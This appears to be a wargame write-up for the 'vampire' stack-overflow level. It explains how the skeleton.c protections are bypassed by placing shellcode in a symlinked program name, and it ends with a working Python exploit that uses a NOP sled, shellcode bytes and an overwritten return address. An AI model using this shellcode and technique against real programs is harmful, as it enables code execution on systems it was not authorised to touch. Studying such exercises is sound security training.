# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program uses strcpy() function that does not check boundary so I can overwrite SFP & RET address.

The protection code in `skeleton.c` is:
```c
// egghunter 
for(i=0; environ[i]; i++)
  memset(environ[i], 0, strlen(environ[i]));

if(argv[1][47] != '\xbf')
{
  printf("stack is still your friend.\n");
  exit(0);
}

// check the length of argument
if(strlen(argv[1]) > 48){
  printf("argument is too long!\n");
  exit(0);
}
// buffer hunter
      memset(buffer, 0, 40);

// ultra argv hunter!
for(i=0; i<saved_argc; i++)
  memset(argv[i], 0, strlen(argv[i]));
```
This program resets all argv[] parameters so I cannot use argv[0](program's name) anymore.

But, in stack, there is a another space that saves program's name.

So I will give shellcode on program's name and get program's name address.

```bash
[vampire@192 vampire]$ cp ./skeleton ./asdfasdf
[vampire@192 vampire]$ 
[vampire@192 vampire]$ ln -s ./asdfasdf ./`python -c 'print "\x90"*10+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*10'`
[vampire@192 vampire]$
```
The program's name saved in:
```
0xbfffffa0:	0x90909090	0x90909090	0x90909090	0x5e11eb90
0xbfffffb0:	0x32b1c931	0xff0e6c80	0x01e98001	0x05ebf675
0xbfffffc0:	0xffffeae8	0x51c132ff	0x74303069	0x63306969
```
# Payload
```python
import os
from struct import *

filename = ""
filename = filename + "/home/vampire/"
filename = filename + "\x90"*30+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*30

payload = ""
payload = payload + "\x90" * 40
payload = payload + "AAAA" # SFP
payload = payload + "\x98\xff\xff\xbf" # RET

os.execv(filename, [filename, payload])
```
